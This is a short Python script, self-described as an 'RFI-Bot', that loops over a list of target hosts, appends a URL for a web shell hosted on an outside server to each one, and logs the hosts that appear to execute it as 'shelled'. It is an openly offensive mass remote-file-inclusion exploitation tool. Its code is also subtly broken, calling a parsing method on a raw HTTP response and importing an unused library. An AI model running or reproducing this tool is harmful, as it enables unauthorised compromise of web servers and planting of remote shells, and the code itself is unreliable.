#!/usr/bin/python3
"""
SecBLiZZ' RFI-Bot by tw!XX
"""
from bs4 import BeautifulSoup
import requests

hostlist = open('result.txt','r').read().splitlines()
shell = "http://www.url-to-retrieve-shell.from/files/shell.txt"

def autoshell(url):    
        try:
            request = requests.get(url+shell)
        except:
            pass
        else:
            if request.findAll('Sh3ll'):
                print(url+" has been shelled!")
                logfile = open('shelled.txt','a')
                logfile.write(url+shell+"\n")
                logfile.close()

for host in hostlist:
    autoshell(host)
